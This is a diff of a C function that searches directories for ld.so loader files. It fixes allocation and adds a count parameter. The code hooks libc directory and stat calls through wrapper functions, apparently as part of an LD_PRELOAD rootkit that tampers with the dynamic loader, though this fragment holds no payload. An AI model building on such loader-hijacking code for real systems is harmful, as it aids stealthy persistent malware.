@@ -1,25 +1,24 @@
-// searches all ldhomes directories for ld.so & returns an array of char pointers to each valid ld.so
-char **ldfind(void){
+// searches all ldhomes directories for ld.so & returns an array of char pointers to each valid ld.so.
+// the pointer allf is updated with the number of located ld.so.
+char **ldfind(int *allf){
     char *home, *ldname, *namedup, *nametok;
     int found=0, isanld=0;
     struct dirent *dir;
     DIR *dp;
     struct stat sbuf;
 
-    char **foundlds = malloc(MAXLDS*(PATH_MAX+1));
+    char **foundlds = malloc(sizeof(char*)*MAXLDS);
     if(!foundlds) return NULL;
-    for(int i=0; i<MAXLDS; i++)
-        foundlds[i] = malloc(PATH_MAX+1);
 
     hook(COPENDIR, CREADDIR, C__LXSTAT);
 
-    for(int i=0; i<sizeofarr(ldhomes); i++){
+    for(int i=0; i<sizeofarr(ldhomes) && found<MAXLDS; i++){
         home = ldhomes[i];
         
         dp = call(COPENDIR, home);
         if(dp == NULL) continue;
 
-        while((dir = call(CREADDIR, dp)) != NULL){
+        while((dir = call(CREADDIR, dp)) != NULL && found<MAXLDS){
             if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                 continue;
 
@@ -35,7 +34,7 @@ char **ldfind(void){
             }
             free(namedup);
 
-            if(isanld != 1)
+            if(!isanld)
                 continue;
             else isanld = 0;
 
@@ -46,23 +45,13 @@ char **ldfind(void){
             if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode))
                 continue;
 
+            foundlds[found] = malloc(PATH_MAX+1);
             strncpy(foundlds[found++], path, PATH_MAX);
-            if(found == MAXLDS)
-                break;
         }
 
         closedir(dp);
-        if(found == MAXLDS)
-            break;
     }
 
-    // free unused
-    for(int i=0; i<MAXLDS; i++){
-        if(strlen(foundlds[i]) == 0){
-            free(foundlds[i]);
-            foundlds[i] = NULL;
-        }
-    }
-
+    *allf = found;
     return foundlds;
 }
